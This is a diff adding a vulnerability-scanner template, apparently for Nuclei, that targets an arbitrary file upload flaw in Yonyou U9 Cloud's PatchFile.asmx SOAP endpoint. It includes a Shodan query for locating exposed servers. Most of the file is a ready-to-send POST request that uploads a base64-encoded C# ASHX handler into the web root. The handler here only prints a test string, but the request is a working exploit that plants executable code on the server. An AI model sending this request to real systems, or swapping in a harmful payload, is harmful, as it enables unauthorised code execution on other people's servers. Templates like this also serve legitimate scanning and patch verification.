@@ -1,0 +1,41 @@
+id: Yonyou_NC_U9_PatchFile_Fileupload
+
+info:
+  name: Yonyou_NC_U9_PatchFile_Fileupload
+  author: HK
+  severity: high
+  description: 用友 U9 cloud /CS/Office/AutoUpdates/PatchFile.asmx接口存在任意文件上传漏洞
+  metadata:
+    max-request: 1
+    shodan-query: body="logo-u9.png"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0
+    Content-Type: text/xml; charset=utf-8
+    Connection: close
+    Content-Length: 877
+
+    <?xml version="1.0" encoding="utf-8"?>
+     <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+       <SaveFile xmlns="http://tempuri.org/">
+        <binData>PCVAIFdlYkhhbmRsZXIgTGFuZ3VhZ2U9IkMjIiBDbGFzcz0iVGVzdEhhbmRsZXIiICU+Cgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5XZWI7CgpwdWJsaWMgY2xhc3MgVGVzdEhhbmRsZXIgOiBJSHR0cEhhbmRsZXIKewogICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY29udGV4dCkKICAgIHsKICAgICAgICBjb250ZXh0LlJlc3BvbnNlLkNvbnRlbnRUeXBlID0gInRleHQvcGxhaW4iOwogICAgICAgIGNvbnRleHQuUmVzcG9uc2UuV3JpdGUoInRlc3QhIik7CiAgICB9CgogICAgcHVibGljIGJvb2wgSXNSZXVzYWJsZQogICAgewogICAgICAgIGdldCB7IHJldHVybiBmYWxzZTsgfQogICAgfQp9</binData>
+        <path>./</path>
+        <fileName>test.ashx</fileName>
+       </SaveFile>
+      </soap:Body>
+     </soap:Envelope>
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - true</SaveFileResult>
